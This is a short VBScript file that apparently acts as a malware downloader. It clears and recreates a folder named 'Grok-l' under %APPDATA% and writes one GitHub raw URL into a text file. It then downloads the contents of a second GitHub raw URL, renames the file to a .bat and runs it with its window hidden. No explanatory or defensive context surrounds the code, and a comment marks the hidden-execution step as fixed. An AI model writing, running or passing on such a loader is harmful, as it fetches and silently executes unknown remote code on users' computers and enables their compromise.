With CreateObject("Scripting.FileSystemObject")
    f = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\Grok-l")
    If .FolderExists(f) Then .DeleteFolder f, True
End With

Set FSO = CreateObject("Scripting.FileSystemObject")
Set WShell = CreateObject("WScript.Shell")
strAppData = WShell.ExpandEnvironmentStrings("%APPDATA%")
strFolder = strAppData & "\Grok-l"

If Not FSO.FolderExists(strFolder) Then FSO.CreateFolder(strFolder)

Set txtFile = FSO.CreateTextFile(strFolder & "\l.txt", True)
txtFile.WriteLine "https://raw.githubusercontent.com/opm4opm4/code/main/done1.txt"
txtFile.Close

Set txtFile2 = FSO.CreateTextFile(strFolder & "\m.txt", True)
Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
xmlHttp.Open "GET", "https://raw.githubusercontent.com/USATIKTOKER/NEWADD/main/main.txt", False
xmlHttp.Send
txtFile2.Write xmlHttp.responseText
txtFile2.Close

WScript.Sleep 5000
FSO.MoveFile strFolder & "\m.txt", strFolder & "\m.bat"
WScript.Sleep 3000

' FIXED: Use quoted path & check if file exists before running
If FSO.FileExists(strFolder & "\m.bat") Then
    WShell.Run Chr(34) & strFolder & "\m.bat" & Chr(34), 0, False
Else
    WScript.Echo "Error: m.bat not found in " & strFolder
End If
